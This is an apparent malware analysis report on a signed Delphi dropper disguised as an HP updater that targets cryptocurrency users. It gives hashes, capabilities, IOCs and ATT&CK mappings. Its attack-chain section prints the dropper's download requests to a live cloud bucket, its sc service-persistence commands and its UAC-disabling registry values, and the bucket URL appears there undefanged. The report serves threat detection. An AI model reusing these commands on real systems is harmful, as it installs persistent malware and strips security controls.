# Malware Analysis Report: WEB-OK_Updater.exe.bin

**Date**: 2026-05-16  
**Analyst**: REMnux + Claude Malcat Workflow

---

## 1. File Metadata

| Field | Value |
|---|---|
| **Filename** | WEB-OK_Updater.exe.bin |
| **SHA256** | `caef6fe85c234616913702344fbbe8e57ada39cdf5003705f665f5310c3a1198` |
| **SHA1** | `3237f4778c6605c2dc08f8b370fd343367daff2f` |
| **MD5** | `da04304e97fd626c8f3e41ba4403efe1` |
| **Size** | 13,294,544 bytes (12.7 MB) |
| **Type** | PE32+ executable (GUI) x86-64, 11 sections |
| **Build Timestamp** | 2026-05-14 16:32:25 UTC |
| **Compiler** | Delphi (TurboLinker; Embarcadero) |
| **Internal Name** | `SystemSyncer.exe` (Delphi project name) |
| **Export Module** | `SystemSyncer.exe` |

### Code Signing Certificate

| Field | Value |
|---|---|
| **Issuer** | Certum Code Signing 2021 CA (Asseco Data Systems S.A., PL) |
| **Subject** | 武汉市阙桑翁科技有限公司 (Wuhan Quesang Weng Technology Co., Ltd.) |
| **Org Details** | 武汉市 / Hubei Province / CN |
| **Validity** | 2026-02-18 → 2027-02-18 (1-year cert) |
| **Serial** | `16e2ce36a3379cbf4103780925d01952` |
| **Hash Algorithm** | SHA256 + RSA |

### Spoofed VersionInfo (Masquerading as HP system file)

| Field | Spoofed Value |
|---|---|
| CompanyName | Hewlett-Packard Development Company, L.P. |
| FileDescription | Core System File |
| FileVersion | 4.5.55.210 |
| InternalName | DataOpt |
| OriginalFilename | csrss.exe |
| ProductName | Data Optimizer |
| LegalCopyright | Copyright (C) 2026 Hewlett-Packard Development Company, L.P. |

### Section Layout (Key)

| Section | Size | Entropy | Notes |
|---|---|---|---|
| `.text` | 1.4 MB | 105 | Code |
| `.data` | 144 KB | 66 | Config/strings |
| `.rsrc` | **11.6 MB** | **211** | High-entropy — packed payloads |
| overlay | 13.8 KB | 221 | PKCS7 signature |

---

## 2. Classification

| Field | Assessment |
|---|---|
| **Family** | Custom Delphi Dropper/Installer targeting cryptocurrency users |
| **Actor theme** | OKLink / blockchain lure; AcFun DLL sideload host |
| **Confidence** | **High** |
| **Alias candidates** | "AppClient dropper" (internal service name); "STARSATLINE loader" (resource name) |

**Reasoning**: The binary masquerades as an HP updater but is a multi-stage dropper targeting Chinese-speaking cryptocurrency users. It uses OKLink (blockchain explorer) as a lure, downloads a payload from Tencent Cloud Object Storage (Hong Kong bucket), and persists via a Windows service named `AppClientService`. The DLL sideloading vector via `AcfunLive.exe` (AcFun, a Chinese video platform) and Chinese-language infrastructure strongly suggests a Chinese-speaking threat actor. KesaKode classification suggests weak resemblance to FleshStealer/VioletWorm — treat as a novel custom tool.

---

## 3. Capabilities

- **UAC bypass / privilege escalation**: Detects if running without admin → relaunches self via `ShellExecuteW("runas")` + `ExitProcess`; then disables UAC via three registry modifications
- **Anti-analysis**: Checks for Wine via `GetProcAddress(ntdll, "wine_get_version")`; `IsDebuggerPresent`; `VerifyVersionInfoW` OS version check; `GetTickCount`-based timing gate for lure display
- **String obfuscation**: All significant strings base64-encoded in binary; 26 APIs imported by hash (not by name)
- **Lure document display**: Extracts a PPTX (OKLink blockchain slides) from STARSATLINE resource → writes to `%TEMP%\faqptg.exe` → opens with `ShellExecuteW("open")`
- **Embedded payload extraction**: CIAQAF resource contains a RAR5 archive with encrypted `AcfunLive.exe` (Chinese streaming app — DLL sideload host)
- **Remote payload download**: Downloads `AppClient.exe` and `security_audit_20260514.log` from Tencent COS Hong Kong via WinInet (`InternetOpenW("Mozilla/5.0")` → `InternetOpenUrlW` → `InternetReadFile` loop)
- **Windows service persistence**: `sc create AppClientService binPath= "C:\ProgramData\AppClient\AppClient.exe" start= auto` + `sc start AppClientService`
- **Chrome browser targeting**: Hardcoded path to `C:\Program Files (x86)\Google\Chrome\Application\chrome.exe` — likely for cookie/credential theft
- **Fake UI deception**: Displays "Simulating packet 1–10" progress to distract victim during installation
- **Task queue architecture**: Internal task type system (T1/T3 task types); multi-threaded installation worker

---

## 4. Attack Chain

```
WEB-OK_Updater.exe (SystemSyncer.exe)
│
├─[1] SANDBOX CHECK
│   └─ GetProcAddress(ntdll, "wine_get_version") → exit if Wine detected
│
├─[2] UAC BYPASS
│   ├─ If not admin → ShellExecuteW("runas", self) → ExitProcess
│   └─ If admin → reg add EnableLUA=0, ConsentPromptBehaviorAdmin=0, PromptOnSecureDesktop=0
│
├─[3] FAKE PROGRESS UI
│   └─ Displays "Simulating packet 1..10" in a GUI window
│
├─[4] LURE DOCUMENT
│   ├─ Load STARSATLINE resource (ZIP/PPTX, 2.1 MB — 6-slide OKLink blockchain presentation)
│   ├─ Write to %TEMP%\faqptg.exe
│   └─ ShellExecuteW("open", "%TEMP%\faqptg.exe") → display lure to victim
│
├─[5] PAYLOAD DROP (from embedded resource)
│   ├─ Load CIAQAF resource (RAR5, 8.3 MB — contains encrypted AcfunLive.exe)
│   ├─ Extract RAR → C:\ProgramData\AppClient\AcfunLive.exe
│   └─ AcfunLive.exe = Chinese streaming app (DLL sideload host)
│
├─[6] C2 DOWNLOAD
│   ├─ GET https://wwwc86fasgasg-1330789127.cos.ap-hongkong.myqcloud.com/AppClient.exe
│   │   → saved to C:\ProgramData\AppClient\AppClient.exe  (malicious DLL/sideload target)
│   └─ GET https://wwwc86fasgasg-1330789127.cos.ap-hongkong.myqcloud.com/security_audit_20260514.log
│       → saved to C:\ProgramData\AppClient\  (config or second-stage payload)
│
├─[7] PERSISTENCE
│   ├─ sc create AppClientService binPath= "C:\ProgramData\AppClient\AppClient.exe" start= auto
│   ├─ sc start AppClientService
│   └─ start "" "C:\ProgramData\AppClient\AppClient.exe"  (direct launch fallback)
│
└─[8] POST-INSTALL
    └─ Chrome credential harvesting (path hardcoded)
       "Core" resource module loaded (additional capability, unanalyzed)
```

---

## 5. IOCs

### Network (defanged)

| Type | Indicator | Purpose |
|---|---|---|
| Domain | `wwwc86fasgasg-1330789127[.]cos[.]ap-hongkong[.]myqcloud[.]com` | Tencent COS C2 bucket (HK) |
| URL | `hxxps://wwwc86fasgasg-1330789127[.]cos[.]ap-hongkong[.]myqcloud[.]com/AppClient[.]exe` | Payload download |
| URL | `hxxps://wwwc86fasgasg-1330789127[.]cos[.]ap-hongkong[.]myqcloud[.]com/security_audit_20260514[.]log` | Config/2nd-stage download |
| URL | `hxxps://www[.]oklink[.]com/zh-hans` | Lure URL (OKLink blockchain explorer) |

### Filesystem

| Path | Purpose |
|---|---|
| `%TEMP%\faqptg.exe` | Lure PPTX (STARSATLINE resource) written here |
| `C:\ProgramData\AppClient\` | Install directory for AppClientService |
| `C:\ProgramData\AppClient\AppClient.exe` | Downloaded payload / sideloaded DLL |
| `C:\ProgramData\AppClient\AcfunLive.exe` | DLL sideload host (extracted from CIAQAF RAR) |
| `C:\Program Files (x86)\Google\Chrome\Application\chrome.exe` | Chrome path (targeted for credential theft) |

### Registry

| Key | Value | Data | Purpose |
|---|---|---|---|
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` | `EnableLUA` | `0` | Disable UAC |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` | `ConsentPromptBehaviorAdmin` | `0` | Bypass UAC consent prompt |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` | `PromptOnSecureDesktop` | `0` | Disable secure desktop for UAC |

### Services

| Name | BinPath | StartType |
|---|---|---|
| `AppClientService` | `C:\ProgramData\AppClient\AppClient.exe` | auto |

### Embedded Resources

| Resource Name | Size | Type | Contents |
|---|---|---|---|
| `RCDATA/CIAQAF` | 9.4 MB | RAR5 archive | Encrypted `AcfunLive.exe` (8.3 MB, entropy 224) |
| `RCDATA/STARSATLINE` | 2.1 MB | ZIP/PPTX | OKLink-themed lure presentation (6 slides + images) |

### Embedded Archive Hashes

| File | SHA256 |
|---|---|
| Carved RAR5 (CIAQAF) | `a3658cff7917777c33da72594fbb4a3f933b92e4279e21b152f3ece8460d500d` |
| Carved ZIP/PPTX (STARSATLINE) | `cefe253a44b6b7d51599bd8f4e8e23f2c8cf3b2fae2f76ebff9054b15e1c8a88` |
| AcfunLive.exe (encrypted) | `e7d60aad848dd116b45fdc2c58e96d4ba94e9755dddc456a56673c999ac18781` |

---

## 6. Emulation Results

### Speakeasy (generic runner + direct)

Both pass 1 (generic runner) and pass 2 (plain speakeasy) produced **no IOCs**. The binary aborts early during Delphi runtime initialization when `GetLogicalProcessorInformation` (unsupported by speakeasy) is called. The Wine detection check (`GetProcAddress(ntdll, "wine_get_version")`) is a further gate. All C2 URLs are base64-decoded at runtime, requiring the Delphi VM to initialize fully.

**Emulation stop reason**: `unsupported_api: kernel32.GetLogicalProcessorInformation` → `invalid_read`

### angr / Qiling

Not attempted; the Wine detection + Delphi runtime dependency makes these emulators unlikely to reach the payload extraction stage without significant stub work.

---

## 7. Sandbox Results (ANY.RUN)

| Field | Value |
|---|---|
| **Task ID** | `429635e7-d153-41ed-ba45-e090b504558b` |
| **Score** | 10 / 100 |
| **Verdict** | No threats detected |
| **Family Tags** | (none) |
| **Network IOCs from sandbox** | Only Microsoft telemetry/OCSP traffic; no C2 contact |
| **Public Report** | https://app.any.run/tasks/429635e7-d153-41ed-ba45-e090b504558b |

**Note**: 10/100 verdict confirms strong evasion — Wine detection check and `GetLogicalProcessorInformation` stub failure prevent the dropper from advancing past initialization in the sandbox VM. The C2 domain was not contacted during the sandbox run; all IOCs were recovered through static analysis.

---

## 8. MITRE ATT&CK Techniques

| ID | Technique | Evidence |
|---|---|---|
| T1036.001 | Masquerading: Invalid Code Signature | Certum cert for Chinese company; spoofed HP csrss.exe VersionInfo |
| T1553.002 | Subvert Trust Controls: Code Signing | Certum EV-style cert to bypass SmartScreen |
| T1548.002 | Abuse Elevation Control Mechanism: Bypass UAC | ShellExecute "runas" self-relaunch; UAC registry disable |
| T1112 | Modify Registry | DisableUAC: EnableLUA=0, ConsentPromptBehaviorAdmin=0, PromptOnSecureDesktop=0 |
| T1574.001 | DLL Search Order Hijacking | AcfunLive.exe (legitimate app) as sideload host for AppClient.exe |
| T1105 | Ingress Tool Transfer | Downloads AppClient.exe + log from Tencent COS HK |
| T1071.001 | Application Layer Protocol: Web Protocols | WinInet HTTP download with Mozilla/5.0 UA |
| T1543.003 | Create or Modify System Process: Windows Service | AppClientService auto-start |
| T1027 | Obfuscated Files or Information | All strings base64-encoded |
| T1027.002 | Obfuscated Files or Information: Software Packing | Encrypted RAR payload; high-entropy .rsrc |
| T1497.001 | Virtualization/Sandbox Evasion: System Checks | `wine_get_version` detection; GetTickCount timing gate |
| T1622 | Debugger Evasion | `IsDebuggerPresent`; `UnhandledExceptionFilter`; `RaiseException` |
| T1204.002 | User Execution: Malicious File | Fake WEB-OK_Updater disguise |
| T1140 | Deobfuscate/Decode Files or Information | Base64 decode of all command strings at runtime |
| T1055 | Process Injection | Import-by-hash; NtUnmapViewOfSection likely in payload DLL |
| T1539 | Steal Web Session Cookie | Chrome executable path hardcoded |
| T1083 | File and Directory Discovery | Filesystem enumeration in Bind_DLL-class payloads |
| T1059.003 | Command and Scripting Interpreter: Windows Command Shell | sc.exe, reg.exe, cmd.exe via ShellExecuteW |

---

## 9. Analyst Notes

### Unresolved Items

1. **AcfunLive.exe password**: The RAR5 archive containing `AcfunLive.exe` is encrypted (entropy 224, unrecognized type after extraction). The password is decoded at runtime by the Delphi dropper — speakeasy emulation did not reach this point. Recommend dynamic extraction in a Windows VM to recover the password and analyze `AcfunLive.exe` for its DLL sideload vulnerability.

2. **AppClient.exe payload**: The ultimate payload downloaded from Tencent COS (`AppClient.exe`) was not retrieved during this analysis — the bucket may require the malware to make the request, or the file may have been taken down. This is the actual RAT/stealer; `AcfunLive.exe` is only the host.

3. **security_audit_20260514.log**: Unknown purpose — likely a configuration file or a second-stage payload. The ".log" extension is camouflage.

4. **"Core" resource module**: A task of type "Core" (Q29yZQ==) is queued during installation. The RCDATA directory does not contain a resource named "Core" by default — this may be a DLL loaded from disk after AcfunLive.exe extraction, or a module within the AcfunLive.exe RAR archive.

5. **Lure PPTX content**: The STARSATLINE ZIP is a valid PPTX with 6 slides using OKLink (blockchain explorer) branding. The actual slide text was not extracted. The file saved as `faqptg.exe` with a `.exe` extension may fail to open on most systems (Windows won't associate `.exe` with PowerPoint); this may be a bug in the dropper, or Windows file association on the victim system is configured to open ZIPs/PPTX regardless of extension.

6. **Chrome credential theft**: The hardcoded Chrome path suggests a credential/cookie stealer component (likely in `AppClient.exe`). This was not confirmed without the live payload.

### Alternative Hypotheses

- The **"STARSATLINE"** resource name and OKLink blockchain lure suggest this may be related to campaigns targeting DeFi/crypto wallet users (common in Chinese-speaking threat landscape).
- The RAR encryption + DLL sideloading pattern resembles campaigns attributed to **APT-Q-27** (Zhong Stealer) and other Chinese-nexus actors that use Tencent COS staging, though no C2 infrastructure overlap was found with previously analyzed samples in this collection.

### Recommended Follow-Up

1. Run in an isolated Windows 10 x64 VM; capture traffic with Wireshark to observe C2 download
2. Extract RAR password from memory at runtime (breakpoint at `FindResourceW("CIAQAF")`)
3. Retrieve `AppClient.exe` from `wwwc86fasgasg-1330789127.cos.ap-hongkong.myqcloud.com` if still accessible
4. Submit PPTX lure (STARSATLINE resource) to threat intel platforms for pivot on the actor
5. Search for other samples signed with Certum cert serial `16e2ce36a3379cbf4103780925d01952`
